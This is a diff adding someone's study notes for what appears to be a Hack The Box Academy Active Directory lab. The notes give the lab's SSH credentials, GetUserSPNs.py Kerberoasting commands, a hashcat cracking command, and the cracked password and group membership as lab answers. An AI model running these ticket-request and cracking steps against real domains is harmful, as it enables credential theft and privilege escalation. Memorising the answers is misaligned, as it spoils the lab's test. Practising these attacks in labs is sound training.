@@ -141,3 +141,21 @@ Candidates.#1....: davius07 -> darten170
 
 Started: Tue Feb 15 17:44:49 2022
 Stopped: Tue Feb 15 17:45:41 2022
+
+
+Challenge : SSH to 10.129.119.173 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"
+
+
+Question 1 -  Retrieve the TGS ticket for the SAPService account. Crack the ticket offline and submit the password as your answer.
+1) ssh in 
+2) GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request     -> password is Klmcargo2   -> we retrieved these earlier on in the module. 
+3) copy and paste hash to host machine
+4) hashcat -m 13100 spshash /usr/share/wordlists/rockyou.txt 
+5) !SapperFi2
+
+
+Question 2 -  What powerful local group on the Domain Controller is the SAPService user a member of? - Account Operators 
+1) in SSH session
+2) GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService -outputfile SAPS_tgs    -> Password : Klmcargo2
+3) output: SAPService/srv01.inlanefreight.local  SAPService  CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL  2022-04-18 14:40:02.959792  <never> 
+
